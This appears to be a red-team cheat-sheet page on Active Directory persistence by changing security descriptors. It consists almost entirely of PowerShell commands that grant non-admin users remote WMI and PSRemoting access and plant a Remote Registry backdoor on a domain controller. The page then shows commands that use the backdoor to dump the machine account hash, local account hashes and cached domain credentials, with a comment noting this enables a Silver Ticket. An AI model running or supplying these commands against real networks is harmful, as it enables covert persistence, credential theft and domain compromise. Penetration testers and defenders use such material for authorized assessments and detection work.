---
description: Security Descriptors (Remoting methods)
---

# Security Descriptors (Remoting methods)

> Once we have local admin privs on a box, this is possible to modify Security Descriptors of remote access methods (WMI, PSRemoting, RemoteRegistry...) to allow access to non-admin users (RCE).

**Note:** In the Domain Controller we need "Domain Admin" privileges. On boxes, only local admin is needed.

### WMI (Using Set-RemoteWMI)

* On local machine:

```bash
Set-RemoteWMI -UserName $USERNAME -Verbose
```

* On remote machine without explicit credentials:

```bash
Set-RemoteWMI -UserName $USERNAME -ComputerName $REMOTE_MACHINE_NAME -namespace 'root\cimv2' -Verbose
```

* On remote machine with explicit credentials:

```bash
Set-RemoteWMI -UserName $USERNAME -ComputerName $REMOTE_MACHINE_NAME -Credential Adminsitrator -namespace 'root\cimv2' -Verbose
```

* On remote machine remove permissions:

```bash
Set-RemoteWMI -UserName $USERNAME -ComputerName $REMOTE_MACHINE_NAME -namespace 'root\cimv2' -Verbose -Remove
```

***

### PSRemoting (Using Set-RemotePSRemoting)

* On local machine:

```bash
Set-RemotePSRemoting -Username $USERNAME -Verbose
```

* On remote machine without credentials:

```bash
Set-RemotePSRemoting -Username $USERNAME -ComputerName $REMOTE_HOSTNAME -Verbose
```

* On remote machine, remove permissions:

```bash
Set-RemotePSRemoting -Username $USERNAME -ComputerName $REMOTE_HOSTNAME -Verbose -Remove
```

***

### Remote Registry (Using DAMP)

* Using DAMP, with admin privs on remote machine:

```bash
Add-RemoteRegBackdoor -ComputerName $DC_HOSTNAME -Trustee $USERNAME -Verbose
```

**Now execute the following commands as $USERNAME:**

* Retrieve machine account hash:

```bash
Get-RemoteMachineAccountHash -ComputerName $DC_HOSTNAME -Verbose #With this we can execute SilverTicket (RCE) 
```

* Retrieve local account hash:

```bash
Get-RemoteLocalAccountHash -ComputerName $DC_HOSTNAME -Verbose 
```

* Retrieve domain cached credentials:

```bash
Get-RemoteCachedCredential -ComputerName $DC_HOSTNAME -Verbose 
```
